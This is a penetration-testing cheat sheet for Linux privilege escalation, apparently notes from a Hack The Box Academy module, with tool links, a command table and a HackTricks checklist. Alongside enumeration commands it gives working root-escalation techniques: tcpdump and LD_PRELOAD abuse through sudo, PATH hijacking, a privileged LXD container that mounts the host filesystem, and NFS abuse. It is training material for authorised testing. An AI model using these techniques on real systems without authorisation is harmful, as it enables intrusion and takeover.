God of all Enumeration: https://github.com/rebootuser/LinEnum
PEAS: https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
Hack Tricks: https://book.hacktricks.xyz/linux-hardening/privilege-escalation
Academy: https://academy.hackthebox.com/module/51/section/466

| **Command**                                                                         | **Description**                                       |
| ----------------------------------------------------------------------------------- | ----------------------------------------------------- |
| `ssh htb-student@<target IP>`                                                       | SSH to lab target                                     |
| `ps aux \| grep root`                                                               | See processes running as root                         |
| `ps au`                                                                             | See logged in users                                   |
| `ls /home`                                                                          | View user home directories                            |
| `ls -l ~/.ssh`                                                                      | Check for SSH keys for current user                   |
| `history`                                                                           | Check the current user's Bash history                 |
| `sudo -l`                                                                           | Can the user run anything as another user?            |
| `ls -la /etc/cron.daily`                                                            | Check for daily Cron jobs                             |
| `lsblk`                                                                             | Check for unmounted file systems/drives               |
| `find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null`                       | Find world-writeable directories                      |
| `find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null`                       | Find world-writeable files                            |
| `uname -a`                                                                          | Check the Kernel versiion                             |
| `cat /etc/lsb-release`                                                              | Check the OS version                                  |
| `gcc kernel_expoit.c -o kernel_expoit`                                              | Compile an exploit written in C                       |
| `screen -v`                                                                         | Check the installed version of `Screen`               |
| `./pspy64 -pf -i 1000`                                                              | View running processes with `pspy`                    |
| `find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null`                     | Find binaries with the SUID bit set                   |
| `find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null`                     | Find binaries with the SETGID bit set                 |
| `sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root` | Priv esc with `tcpdump`                               |
| `echo $PATH`                                                                        | Check the current user's PATH variable contents       |
| `PATH=.:${PATH}`                                                                    | Add a `.` to the beginning of the current user's PATH |
| `find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null`                   | Search for config files                               |
| `ldd /bin/ls`                                                                       | View the shared objects required by a binary          |
| `sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart`                            | Escalate privileges using `LD_PRELOAD`                |
| `readelf -d payroll \| grep PATH`                                                   | Check the RUNPATH of a binary                         |
| `gcc src.c -fPIC -shared -o /development/libshared.so`                              | Compiled a shared libary                              |
| `lxd init`                                                                          | Start the LXD initialization process                  |
| `lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine`                  | Import a local image                                  |
| `lxc init alpine r00t -c security.privileged=true`                                  | Start a privileged LXD container                      |
| `lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true`      | Mount the host file system in a container             |
| `lxc start r00t`                                                                    | Start the container                                   |
| `showmount -e 10.129.2.12`                                                          | Show the NFS export list                              |
| `sudo mount -t nfs 10.129.2.12:/tmp /mnt`                                           | Mount an NFS share locally                            |
| `tmux -S /shareds new -s debugsess`                                                 | Created a shared `tmux` session socket                |
| `./lynis audit system`                                                              | Perform a system audit with `Lynis`                   |
==Checklist==
##### [System Information](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/#system-information)

* [ ] Get **OS information**
* [ ] Check the [**PATH**](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/#path), any **writable folder**?
* [ ] Check [**env variables**](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/#env-info), any sensitive detail?
* [ ] Search for [**kernel exploits**](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/#kernel-exploits) **using scripts** (DirtyCow?)
* [ ] **Check** if the [**sudo version** is vulnerable](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/#sudo-version)
* [ ] [**Dmesg** signature verification failed](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/#dmesg-signature-verification-failed)
* [ ] More system enum ([date, system stats, cpu info, printers](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/#more-system-enumeration))
* [ ] [Enumerate more defenses](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/#enumerate-possible-defenses)

##### [Drives](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/#drives)

* [ ] **List mounted** drives
* [ ] **Any unmounted drive?**
* [ ] **Any creds in fstab?**

##### [**Installed Software**](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/#installed-software)

* [ ] **Check for**[ **useful software**](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/#useful-software) **installed**
* [ ] **Check for** [**vulnerable software**](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/#vulnerable-software-installed) **installed**

##### [Processes](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/#processes)

* [ ] Is any **unknown software running**?
* [ ] Is any software running with **more privileges than it should have**?
* [ ] Search for **exploits of running processes** (especially the version running).
* [ ] Can you **modify the binary** of any running process?
* [ ] **Monitor processes** and check if any interesting process is running frequently.
* [ ] Can you **read** some interesting **process memory** (where passwords could be saved)?

##### [Scheduled/Cron jobs?](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/#scheduled-jobs)

* [ ] Is the [**PATH** ](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/#cron-path)being modified by some cron and you can **write** in it?
* [ ] Any [**wildcard** ](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/#cron-using-a-script-with-a-wildcard-wildcard-injection)in a cron job?
* [ ] Some [**modifiable script** ](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/#cron-script-overwriting-and-symlink)is being **executed** or is inside **modifiable folder**?
* [ ] Have you detected that some **script** could be or are being [**executed** very **frequently**](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/#frequent-cron-jobs)? (every 1, 2 or 5 minutes)

##### [Services](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/#services)

* [ ] Any **writable .service** file?
* [ ] Any **writable binary** executed by a **service**?
* [ ] Any **writable folder in systemd PATH**?

##### [Timers](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/#timers)

* [ ] Any **writable timer**?

##### [Sockets](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/#sockets)

* [ ] Any **writable .socket** file?
* [ ] Can you **communicate with any socket**?
* [ ] **HTTP sockets** with interesting info?

##### [D-Bus](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/#d-bus)

* [ ] Can you **communicate with any D-Bus**?

##### [Network](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/#network)

* [ ] Enumerate the network to know where you are
* [ ] **Open ports you couldn't access before** getting a shell inside the machine?
* [ ] Can you **sniff traffic** using `tcpdump`?

##### [Users](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/#users)

* [ ] Generic users/groups **enumeration**
* [ ] Do you have a **very big UID**? Is the **machine** **vulnerable**?
* [ ] Can you [**escalate privileges thanks to a group**](privilege-escalation/interesting-groups-linux-pe/) you belong to?
* [ ] **Clipboard** data?
* [ ] Password Policy?
* [ ] Try to **use** every **known password** that you have discovered previously to login **with each** possible **user**. Try to login also without a password.

##### [Writable PATH](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/#writable-path-abuses)

* [ ] If you have **write privileges over some folder in PATH** you may be able to escalate privileges

##### [SUDO and SUID commands](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/#sudo-and-suid)

* [ ] Can you execute **any command with sudo**? Can you use it to READ, WRITE or EXECUTE anything as root? ([**GTFOBins**](https://gtfobins.github.io))
* [ ] Is any **exploitable SUID binary**? ([**GTFOBins**](https://gtfobins.github.io))
* [ ] Are [**sudo** commands **limited** by **path**? can you **bypass** the restrictions](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/#sudo-execution-bypassing-paths)?
* [ ] [**Sudo/SUID binary without path indicated**](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/#sudo-command-suid-binary-without-command-path)?
* [ ] [**SUID binary specifying path**](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/#suid-binary-with-command-path)? Bypass
* [ ] [**LD\_PRELOAD vuln**](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/#ld\_preload)
* [ ] [**Lack of .so library in SUID binary**](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/#suid-binary-so-injection) from a writable folder?
* [ ] [**SUDO tokens available**](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/#reusing-sudo-tokens)? [**Can you create a SUDO token**](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/#var-run-sudo-ts-less-than-username-greater-than)?
* [ ] Can you [**read or modify sudoers files**](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/#etc-sudoers-etc-sudoers-d)?
* [ ] Can you [**modify /etc/ld.so.conf.d/**](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/#etc-ld-so-conf-d)?
* [ ] [**OpenBSD DOAS**](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/#doas) command

##### [Capabilities](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/#capabilities)

* [ ] Has any binary any **unexpected capability**?

##### [ACLs](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/#acls)

* [ ] Has any file any **unexpected ACL**?

##### [Open Shell sessions](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/#open-shell-sessions)

* [ ] **screen**
* [ ] **tmux**

##### [SSH](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/#ssh)

* [ ] **Debian** [**OpenSSL Predictable PRNG - CVE-2008-0166**](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/#debian-openssl-predictable-prng-cve-2008-0166)
* [ ] [**SSH Interesting configuration values**](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/#ssh-interesting-configuration-values)

##### [Interesting Files](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/#interesting-files)

* [ ] **Profile files** - Read sensitive data? Write to privesc?
* [ ] **passwd/shadow files** - Read sensitive data? Write to privesc?
* [ ] **Check commonly interesting folders** for sensitive data
* [ ] **Weird Location/Owned files,** you may have access to or alter executable files
* [ ] **Modified** in last mins
* [ ] **Sqlite DB files**
* [ ] **Hidden files**
* [ ] **Script/Binaries in PATH**
* [ ] **Web files** (passwords?)
* [ ] **Backups**?
* [ ] **Known files that contains passwords**: Use **Linpeas** and **LaZagne**
* [ ] **Generic search**

##### [**Writable Files**](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/#writable-files)

* [ ] **Modify python library** to execute arbitrary commands?
* [ ] Can you **modify log files**? **Logtotten** exploit
* [ ] Can you **modify /etc/sysconfig/network-scripts/**? Centos/Redhat exploit
* [ ] Can you [**write in ini, int.d, systemd or rc.d files**](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/#init-init-d-systemd-and-rc-d)?

##### [**Other tricks**](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/#other-tricks)

* [ ] Can you [**abuse NFS to escalate privileges**](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/#nfs-privilege-escalation)?
* [ ] Do you need to [**escape from a restrictive shell**](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/#escaping-from-restricted-shells)?